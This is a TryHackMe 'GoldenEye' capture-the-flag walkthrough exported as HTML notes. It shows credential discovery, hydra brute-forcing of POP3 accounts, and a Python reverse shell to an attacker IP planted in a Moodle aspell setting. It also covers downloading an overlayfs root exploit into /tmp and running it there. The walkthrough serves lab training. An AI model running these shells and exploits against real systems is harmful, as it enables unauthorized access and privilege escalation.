<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>goldeneye</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>goldeneye</h1><br/><p><strong><h1>THM: GoldenEye</h1></strong></p><p></p><p></p><p><strong><h2>Enumeration</h2></strong></p><p></p><p><strong><span style="text-decoration:underline;">Rustscan &amp; Nmap</span></strong></p><p><img src="images/39-1.png" alt="images/39-1.png" /></p><p></p><p><strong>4 Open Ports</strong></p><p></p><p><strong><span style="text-decoration:underline;">Browser Enumeration</span></strong></p><p><img src="images/39-2.png" alt="images/39-2.png" /></p><p></p><p>We go to view source and inspect each element. One such important link is clicking on <strong>terminal.js</strong></p><p><img src="images/39-3.png" alt="images/39-3.png" /></p><p></p><p>It opens the <strong>terminal.js</strong> file</p><p></p><p><img src="images/39-4.png" alt="images/39-4.png" /></p><p></p><p>We found an user “boris” and an encoded password. (it looks like HTML encoding)</p><p></p><p><strong>https://onlineasciitools.com/convert-html-entities-to-ascii</strong></p><p></p><p><img src="images/39-5.png" alt="images/39-5.png" />.</p><p></p><p></p><p><strong>Credentials Found</strong></p><p>Username: 	<strong>boris</strong></p><p>Password: 	<strong>InvincibleHack3r</strong></p><p></p><p>We go the instructed directory. /sev-home/ and enter the credentials.</p><p><img src="images/39-6.png" alt="images/39-6.png" /></p><p></p><p></p><p></p><p>Lets see the page.</p><p><img src="images/39-7.png" alt="images/39-7.png" /></p><p></p><p></p><p>We also view its source and scroll down to find some additional info.</p><p><img src="images/39-8.png" alt="images/39-8.png" /></p><p></p><p></p><p>It talks about pop3 service. Lets check the <strong>pop3</strong> service which is running on <strong>55007</strong> &amp; try to login with the previously found credentials.</p><p></p><p><img src="images/39-9.png" alt="images/39-9.png" /></p><p></p><p></p><p>I searched everywhere and found no credentials for such. We need to use hydra.</p><p>Note: We use a small wordlist here (Not rockyou.txt)</p><p></p><p><strong>/usr/share/set/src/fasttrack/wordlist.txt</strong></p><p></p><p></p><p><strong>Hydra</strong></p><p></p><p><strong>hydra -l boris -P /usr/share/set/src/fasttrack/wordlist.txt -vv -s 55007 10.10.64.114 pop3</strong></p><p><img src="images/39-10.png" alt="images/39-10.png" /></p><p></p><p><strong>hydra -l natalya -P /usr/share/set/src/fasttrack/wordlist.txt -vv -s 55007 10.10.64.114 pop3</strong></p><p><img src="images/39-11.png" alt="images/39-11.png" /></p><p></p><p></p><p><strong>POP3 Credentials Found</strong></p><p>Username	:	<strong>boris</strong></p><p>Password		:	<strong>secret1!</strong></p><p></p><p>Username	:	<strong>natalya</strong></p><p>Password		:	<strong>bird</strong></p><p></p><p></p><p></p><p>Lets Enumerate Mails for <strong>Boris</strong></p><p><img src="images/39-12.png" alt="images/39-12.png" /></p><p></p><p><img src="images/39-13.png" alt="images/39-13.png" /></p><p></p><p>It says that some code is in <strong>/root</strong> directory.</p><p></p><p></p><p>Lets Enumerate Mails for <strong>Natalya</strong></p><p><img src="images/39-14.png" alt="images/39-14.png" /></p><p></p><p><img src="images/39-15.png" alt="images/39-15.png" /></p><p></p><p>We found training site&#39;s credentials &amp; also the mail instructed us the input <strong>severnaya-station.com</strong> into <strong>hosts</strong> file</p><p></p><p><strong>Training Site Credentials Found:</strong></p><p>Username	:	<strong>xenia</strong></p><p>Password		:	<strong>RCP90rulez!</strong></p><p></p><p></p><p>After adding the entry in host file of my local machine. I go to the trainging webpage: <strong>severnaya-station.com/gnocertdir</strong></p><p><img src="images/39-16.png" alt="images/39-16.png" /></p><p></p><p>We opened the link mentioned in the mail. There is a <strong>“Intro to GoldenEye”</strong> training course. We try to login with the <strong>POP3 credentials</strong> found earlier.</p><p></p><p><img src="images/39-17.png" alt="images/39-17.png" /></p><p></p><p><strong>boris&#39;s</strong> &amp; <strong>natalya&#39;s</strong> credentials didn&#39;t work. Now, we try with <strong>xenia&#39;s</strong> credential it worked.</p><p></p><p>There is a message for the user. I will check it.</p><p></p><p><img src="images/39-18.png" alt="images/39-18.png" /></p><p></p><p></p><p>Also the page url looks vulnerable: <strong>http://severnaya-station.com/gnocertdir/enrol/index.php?id=1</strong> <strong>[Miscellanous]</strong></p><p>Also the page url looks vulnerable: <strong>http://severnaya-station.com/gnocertdir/enrol/index.php?id=2</strong> <strong>[GNO]</strong></p><p></p><p>We go to messages and open the message for <strong>Dr. Doak</strong></p><p><img src="images/39-19.png" alt="images/39-19.png" /></p><p></p><p>We find the message and get a new POP3 mail user named <strong>doak</strong></p><p><img src="images/39-20.png" alt="images/39-20.png" /></p><p></p><p>Lets try to crack the <strong>doak</strong> user&#39;s password with <strong>hydra</strong></p><p><strong>hydra -l doak -P /usr/share/set/src/fasttrack/wordlist.txt -vv -s 55007 10.10.18.58 pop3</strong></p><p></p><p><img src="images/39-21.png" alt="images/39-21.png" /></p><p></p><p><strong>POP3 Credentials Found</strong></p><p>Username	:	<strong>doak</strong></p><p>Password		:	<strong>goat</strong></p><p></p><p>Lets Enumerate the mail ID </p><p><img src="images/39-22.png" alt="images/39-22.png" /></p><p></p><p></p><p>Indeed we find further instructions and training site credentials.</p><p><strong>Training Site Credentials Found:</strong></p><p>Username	:	<strong>dr_doak</strong></p><p>Password		:	<strong>4England!</strong></p><p></p><p></p><p>We login to the training site with the need credentials and go to <strong>My Profile → My Private files</strong> &amp; click on <strong>s3cret.txt</strong>. It will be downloaded.</p><p><img src="images/39-23.png" alt="images/39-23.png" /></p><p></p><p></p><p>We opened the file.</p><p><img src="images/39-24.png" alt="images/39-24.png" /></p><p></p><p>We got additonal instructions. We are asked to check for credentials in the link provided. Lets visit it.</p><p></p><p><img src="images/39-25.png" alt="images/39-25.png" /></p><p></p><p>I download the image file locally for inspection.</p><p></p><p><img src="images/39-26.png" alt="images/39-26.png" /></p><p></p><p>I found a fishy base64 encoded string in the <strong>Image Description</strong> Field. Lets decode it</p><p><img src="images/39-27.png" alt="images/39-27.png" /></p><p></p><p>It looks like a password.</p><p><strong>Training Site Credentials Found:</strong></p><p>Username	:	<strong>admin</strong></p><p>Password		:	<strong>xWinter1995x!</strong></p><p></p><p><img src="images/39-28.png" alt="images/39-28.png" /></p><p></p><p></p><p></p><p><strong><h2>Foothold</h2></strong></p><p></p><p>There is a hint about <strong>aspell</strong> plugin. I searched for <strong>aspell</strong>. I found a <strong>System paths</strong> link</p><p></p><p><img src="images/39-29.png" alt="images/39-29.png" /></p><p></p><p>Lets add our code in the <strong>Path to aspell</strong></p><p></p><p>Python Code Used:</p><p></p><p><strong>python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);</strong></p><p><strong>s.connect((&quot;10.11.72.31&quot;,7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);</strong></p><p><strong>os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#39;  </strong></p><p></p><p>Then we save changes.</p><p></p><p><strong>Important</strong></p><p>Also, change the spell checker from<strong> Google Spell</strong> to <strong>PShellShell</strong></p><p>Search for <strong>spell</strong>.</p><p></p><p><img src="images/39-30.png" alt="images/39-30.png" /></p><p></p><p>Start a netcat listner</p><p></p><p>To execute our code. We need to create a new page and spellcheck it.</p><p>We need to <strong>My profile --&gt; Blogs --&gt; Add a new entry</strong></p><p>clik on the “<strong>Toggle spell checker</strong>”</p><p></p><p><img src="images/39-31.png" alt="images/39-31.png" /></p><p></p><p></p><p>We got a connection.</p><p><img src="images/39-32.png" alt="images/39-32.png" /></p><p></p><p></p><p><strong><h1>Privilege Escalation</h1></strong></p><p></p><p><strong>THM Hint:</strong> </p><p></p><p>This machine is vulnerable to the <strong>overlayfs exploit</strong>. The exploitation is technically very simple:</p><p>• Create new user and mount namespace using clone with CLONE_NEWUSER|CLONE_NEWNS flags.</p><p>• Mount an overlayfs using /bin as lower filesystem, some temporary directories as upper and work directory.</p><p>• Overlayfs mount would only be visible within user namespace, so let namespace process change CWD to overlayfs, thus making the overlayfs also visible outside the namespace via the proc filesystem.</p><p>• Make su on overlayfs world writable without changing the owner</p><p>• Let process outside user namespace write arbitrary content to the file applying a slightly modified variant of the SetgidDirectoryPrivilegeEscalation exploit.</p><p>• Execute the modified su binary</p><p></p><p>You can download the exploit from here: <strong>https://www.exploit-db.com/exploits/37292</strong></p><p></p><p></p><p>Lets use searchsploit for the same.</p><p><img src="images/39-33.png" alt="images/39-33.png" /></p><p></p><p><strong>Important</strong> <strong>Note:</strong> At this point, we will just compile the code and take the executible to the target linux machine. However, after running the code on the target machine, we came to know that <strong>gcc</strong> is not installed there and our program needs gcc in its exploit function. </p><p></p><p>Upon Enumerating the machine, we find that <strong>cc</strong> is installed which is also a C Program Compiler.</p><p></p><p><strong>Solution</strong>: We modify our c program to use <strong>cc</strong> compiler instead of <strong>gcc</strong></p><p>I opened the 37292.c file for edit. I searched for <strong>gcc</strong>. There are two matches, one in the hint and another in the program.</p><p><img src="images/39-34.png" alt="images/39-34.png" /></p><p></p><p>I will edit the one on line <strong>143</strong> from <strong>gcc</strong> to <strong>cc</strong>.</p><p>Now, Lets compile the program again.</p><p></p><p><img src="images/39-35.png" alt="images/39-35.png" /></p><p></p><p>Or use <strong>sed</strong> to edit: <strong>sed -i &quot;s/gcc/cc/g&quot; 37292.c</strong></p><p></p><p><strong>gcc 37292.c -o exploit</strong></p><p><img src="images/39-36.png" alt="images/39-36.png" /></p><p></p><p>Now we will host a web page from this location.</p><p></p><p><strong>python -m http.server 80</strong></p><p><img src="images/39-37.png" alt="images/39-37.png" /></p><p></p><p>Note: I tried this and it <strong>didn&#39;t work</strong>. It seems the <strong>c program</strong> has to be also compiled in <strong>cc</strong> from my kali machine</p><p></p><p><strong>cc 37292.c -o cc_exploit</strong></p><p><img src="images/39-38.png" alt="images/39-38.png" /></p><p></p><p></p><p>We go inside /tmp directory. Then we download the program.</p><p><strong>wget http://10.11.72.31/cc_exploit</strong></p><p>We change its permission to executible</p><p><strong>chmod +x cc_exploit</strong></p><p>We run the exploit</p><p><strong>./cc_exploit</strong></p><p><img src="images/39-39.png" alt="images/39-39.png" /></p><p></p><p>As we can see, we have root access now.</p><p></p><p><img src="images/39-40.png" alt="images/39-40.png" /></p><p></p><p>We see the <strong>root</strong> flag and an instruction to visit to webpage.</p><p>The webpage has a congratulations message.</p><p></p><p>Thanks!!</p></div>
</body>
</html>
